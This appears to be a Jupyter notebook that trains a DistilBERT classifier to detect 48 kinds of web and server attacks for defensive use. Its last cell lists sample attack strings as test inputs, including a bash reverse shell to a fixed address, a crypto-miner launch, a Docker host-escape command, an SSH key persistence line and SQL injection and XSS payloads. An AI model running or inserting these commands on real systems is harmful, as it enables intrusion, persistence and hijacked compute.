# 🛡️ Enterprise VPS Security AI — Training Notebook

Fine-tunes `distilbert-base-uncased` on `enterprise_security_dataset.csv`
to classify **48 attack categories** (26 web + 22 server/Linux attacks).

### Features:
- Universal Compatibility: Kaggle, Google Colab, or Local GPU
- Multi-class classification (48 labels)
- Train / Validation / Test split (80/10/10)
- Full evaluation: Accuracy, Precision, Recall, F1-Score
- Confusion Matrix heatmap
- Classification Report
- Export `attack_model.zip` for VPS deployment

In [ ]:
# Step 1: Install dependencies
!pip install -q transformers datasets torch accelerate scikit-learn seaborn matplotlib pandas numpy

In [ ]:
import os
import torch
import pandas as pd
import numpy as np
import json
import seaborn as sns
import matplotlib.pyplot as plt
from datasets import Dataset
from transformers import (
    AutoTokenizer,
    AutoModelForSequenceClassification,
    TrainingArguments,
    Trainer,
    DataCollatorWithPadding
)
from sklearn.metrics import (
    accuracy_score,
    precision_recall_fscore_support,
    classification_report,
    confusion_matrix
)
from sklearn.preprocessing import LabelEncoder

torch.manual_seed(42)
np.random.seed(42)
print('PyTorch Version:', torch.__version__)
print('CUDA Available:', torch.cuda.is_available())
if torch.cuda.is_available():
    print('GPU:', torch.cuda.get_device_name(0))

In [ ]:
# Step 2: Load dataset (compatible with Kaggle, Colab, and Local)
DATASET_NAME = 'enterprise_security_dataset.csv'
file_found = None

search_paths = [
    DATASET_NAME,
    f'./{DATASET_NAME}',
    f'/content/{DATASET_NAME}'
]

# Automatically search Kaggle Input directories
if os.path.exists('/kaggle/input'):
    for root, dirs, files_list in os.walk('/kaggle/input'):
        for f in files_list:
            if f.endswith('.csv'):
                search_paths.insert(0, os.path.join(root, f))

for p in search_paths:
    if os.path.exists(p):
        file_found = p
        break

if not file_found:
    try:
        from google.colab import files
        print('Please upload enterprise_security_dataset.csv:')
        uploaded = files.upload()
        file_found = DATASET_NAME
    except (ImportError, Exception):
        pass

if not file_found or not os.path.exists(file_found):
    raise FileNotFoundError('enterprise_security_dataset.csv not found! Please check your dataset input.')

print(f'Loading dataset from: {file_found}')
df = pd.read_csv(file_found)
df = df.dropna(subset=['text', 'label'])
df = df[df['text'].str.strip() != ''].reset_index(drop=True)

print(f'Dataset loaded: {len(df)} samples, {df["label"].nunique()} classes')
print(f'\nLabel distribution:')
print(df['label'].value_counts())

In [ ]:
# Step 3: Encode labels
le = LabelEncoder()
df['label_id'] = le.fit_transform(df['label'])

all_labels = le.classes_.tolist()
num_labels = len(all_labels)
id2label = {i: l for i, l in enumerate(all_labels)}
label2id = {l: i for i, l in enumerate(all_labels)}

print(f'Total classes: {num_labels}')
print(f'Labels: {all_labels}')

In [ ]:
# Step 4: Load tokenizer
MODEL_NAME = 'distilbert-base-uncased'
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)

# Test tokenization
sample = df['text'].iloc[0]
tokens = tokenizer(sample, truncation=True, max_length=256)
print(f'Sample: {sample[:80]}...')
print(f'Token IDs: {tokens["input_ids"][:20]}...')
print(f'Token count: {len(tokens["input_ids"])}')

In [ ]:
# Step 5: Split dataset (80% train, 10% validation, 10% test)
from sklearn.model_selection import train_test_split

train_df, temp_df = train_test_split(df, test_size=0.20, random_state=42, stratify=df['label'])
val_df, test_df = train_test_split(temp_df, test_size=0.50, random_state=42, stratify=temp_df['label'])

print(f'Train: {len(train_df)} samples')
print(f'Val  : {len(val_df)} samples')
print(f'Test : {len(test_df)} samples')

In [ ]:
# Step 6: Create HuggingFace Datasets and tokenize
def tokenize_function(examples):
    return tokenizer(
        examples['text'],
        truncation=True,
        max_length=256,
        padding=False
    )

def make_dataset(dataframe):
    ds = Dataset.from_pandas(dataframe[['text', 'label_id']].rename(columns={'label_id': 'labels'}))
    ds = ds.map(tokenize_function, batched=True, remove_columns=['text'])
    return ds

train_dataset = make_dataset(train_df)
val_dataset = make_dataset(val_df)
test_dataset = make_dataset(test_df)

print(f'Tokenized: Train={len(train_dataset)}, Val={len(val_dataset)}, Test={len(test_dataset)}')

In [ ]:
# Step 7: Load DistilBERT model
model = AutoModelForSequenceClassification.from_pretrained(
    MODEL_NAME,
    num_labels=num_labels,
    id2label=id2label,
    label2id=label2id
)
print(f'Model loaded: {MODEL_NAME} with {num_labels} output labels')
print(f'Parameters: {sum(p.numel() for p in model.parameters()):,}')

In [ ]:
# Step 8: Training configuration
training_args = TrainingArguments(
    output_dir='./results',
    num_train_epochs=4,
    per_device_train_batch_size=32,
    per_device_eval_batch_size=64,
    warmup_ratio=0.1,
    learning_rate=2e-5,
    weight_decay=0.01,
    logging_dir='./logs',
    logging_steps=50,
    eval_strategy='epoch',
    save_strategy='epoch',
    load_best_model_at_end=True,
    metric_for_best_model='eval_loss',
    fp16=torch.cuda.is_available(),
    report_to='none',
    disable_tqdm=False,
    dataloader_num_workers=2,
)

def compute_metrics(eval_pred):
    logits, labels = eval_pred
    preds = np.argmax(logits, axis=-1)
    acc = accuracy_score(labels, preds)
    precision, recall, f1, _ = precision_recall_fscore_support(labels, preds, average='weighted', zero_division=0)
    return {'accuracy': acc, 'precision': precision, 'recall': recall, 'f1': f1}

data_collator = DataCollatorWithPadding(tokenizer=tokenizer)

trainer = Trainer(
    model=model,
    args=training_args,
    train_dataset=train_dataset,
    eval_dataset=val_dataset,
    data_collator=data_collator,
    compute_metrics=compute_metrics,
)

print('Training configuration ready.')

In [ ]:
# Step 9: TRAIN THE MODEL
print('Starting training...')
trainer.train()
print('Training complete!')

In [ ]:
# Step 10: Evaluate on TEST set
print('Evaluating on test set...')

predictions = trainer.predict(test_dataset)
preds = np.argmax(predictions.predictions, axis=-1)
true_labels = predictions.label_ids

# Metrics
acc = accuracy_score(true_labels, preds)
precision, recall, f1, _ = precision_recall_fscore_support(true_labels, preds, average='weighted', zero_division=0)

print(f'\n{"="*50}')
print(f'TEST SET EVALUATION')
print(f'{"="*50}')
print(f'Accuracy  : {acc*100:.2f}%')
print(f'Precision : {precision*100:.2f}%')
print(f'Recall    : {recall*100:.2f}%')
print(f'F1-Score  : {f1*100:.2f}%')

In [ ]:
# Step 11: Full Classification Report
pred_labels = [id2label[p] for p in preds]
true_label_names = [id2label[t] for t in true_labels]

print('\nCLASSIFICATION REPORT:')
print(classification_report(true_label_names, pred_labels, zero_division=0))

In [ ]:
# Step 12: Confusion Matrix Heatmap
cm = confusion_matrix(true_labels, preds)

plt.figure(figsize=(24, 20))
sns.heatmap(
    cm, annot=True, fmt='d', cmap='Blues',
    xticklabels=all_labels, yticklabels=all_labels,
    linewidths=0.5, linecolor='gray'
)
plt.title('Enterprise VPS Security AI - Confusion Matrix', fontsize=16)
plt.xlabel('Predicted', fontsize=12)
plt.ylabel('True', fontsize=12)
plt.xticks(rotation=90, fontsize=8)
plt.yticks(rotation=0, fontsize=8)
plt.tight_layout()
plt.savefig('confusion_matrix.png', dpi=150)
plt.show()
print('Confusion matrix saved to confusion_matrix.png')

In [ ]:
# Step 13: Save model and tokenizer
SAVE_DIR = './trained_model'
os.makedirs(SAVE_DIR, exist_ok=True)

model.save_pretrained(SAVE_DIR)
tokenizer.save_pretrained(SAVE_DIR)

# Save label mapping
with open(os.path.join(SAVE_DIR, 'label_mapping.json'), 'w') as f:
    json.dump({'id2label': id2label, 'label2id': label2id, 'all_labels': all_labels}, f, indent=2)

print(f'Model saved to {SAVE_DIR}/')
print(f'Files: {os.listdir(SAVE_DIR)}')

In [ ]:
# Step 14: Export attack_model.zip
import shutil

zip_path = shutil.make_archive('attack_model', 'zip', '.', 'trained_model')
print(f'Model exported to: {zip_path}')
print(f'Size: {os.path.getsize(zip_path) / (1024*1024):.1f} MB')

# Download file if on Google Colab
try:
    from google.colab import files
    files.download('attack_model.zip')
except (ImportError, Exception):
    print('\n--> Running on Kaggle / Local environment.')
    print('    You can download "attack_model.zip" directly from the Output/Files section in the right sidebar!')

In [ ]:
# Step 15: Quick smoke test
from transformers import pipeline

classifier = pipeline('text-classification', model=model, tokenizer=tokenizer, top_k=3, device=0 if torch.cuda.is_available() else -1)

test_payloads = [
    ("SQL Injection", "' OR 1=1 --"),
    ("XSS", "<script>alert('xss')</script>"),
    ("SSH BruteForce", "Failed password for root from 192.168.1.100 port 22 ssh2"),
    ("Reverse Shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    ("Cryptomining", "./xmrig --donate-level=0 -o pool.minexmr.com:3333 -u WALLET"),
    ("Docker Abuse", "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"),
    ("Benign", "GET /api/v1/users/123 HTTP/1.1"),
    ("Path Traversal", "../../etc/passwd"),
    ("Persistence", "echo 'ssh-rsa AAAA... attacker@evil' >> /root/.ssh/authorized_keys"),
    ("Ransomware", "openssl enc -aes-256-cbc -in data.db -out data.db.locked -k secretkey"),
]

print(f'{"="*70}')
print(f'{"CATEGORY":<20} {"INPUT":<45} {"PREDICTION":<25} CONF')
print(f'{"="*70}')
for category, payload in test_payloads:
    result = classifier(payload)[0]
    best = result[0]
    status = 'OK' if best['label'].lower().replace('_','') in category.lower().replace(' ','').replace('_','') or \
             category.lower().replace(' ','') in best['label'].lower().replace('_','') else '??'
    print(f'{category:<20} {payload[:43]:<45} {best["label"]:<25} {best["score"]:.4f} {status}')
print(f'{"="*70}')
print('Training and evaluation complete!')